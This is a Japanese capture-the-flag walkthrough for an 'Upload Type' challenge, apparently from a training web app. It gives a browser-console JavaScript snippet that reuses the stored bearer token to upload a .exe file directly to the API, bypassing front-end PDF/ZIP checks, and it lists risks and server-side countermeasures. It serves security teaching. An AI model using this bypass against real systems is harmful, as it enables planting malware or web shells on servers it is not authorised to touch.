# Upload Type ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** 入力検証
**目標:** PDF/ZIP以外のファイル拡張子をアップロード

---

## 実行手順

DevToolsのConsoleで以下を実行:

```javascript
const token = localStorage.getItem('token');
const blob = new Blob(['test'], { type: 'application/octet-stream' });
const file = new File([blob], 'test.exe', { type: 'application/octet-stream' });
const formData = new FormData();
formData.append('file', file);

fetch('/file-upload', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer ' + token },
  body: formData
});
```

## 解説

- フロントエンドではPDF/ZIPのみ許可
- しかしAPIに直接送信すると他の拡張子も受け入れる
- 実行可能ファイル（.exe）やスクリプト（.js）もアップロード可能

**リスク:**
- マルウェアのアップロード
- Webシェルの設置
- サーバーサイドスクリプトの実行

**対策:**
- サーバー側でファイルタイプを検証
- 拡張子だけでなくマジックバイトも確認
- アップロードディレクトリの実行権限を無効化

## 関連チャレンジ

- [Upload Size](upload-size.md)
- [Deprecated Interface](../difficulty-2/deprecated-interface.md)
